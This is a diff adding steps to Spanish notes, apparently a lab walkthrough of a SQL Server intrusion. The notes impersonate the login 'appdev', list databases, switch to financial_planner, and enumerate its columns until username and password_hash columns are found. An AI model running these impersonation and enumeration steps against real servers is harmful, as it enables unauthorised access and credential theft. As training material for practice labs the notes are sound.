@@ -33,3 +33,9 @@ Vamos a buscar un usuario al que se pueda impersonar
 Impersonamos al usuario con `EXECUTE AS LOGIN ='appdev';`
 
 Enumeramos las bases de daros `SELECT name FROM sys.databases;`
+
+Seleccionamos la bese de datos que queremos enumerar `USE financial_planner;`
+
+Enumeramos las columnas de esta con `SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS;`
+
+Encontramos columnas llamdas username y password_hash 
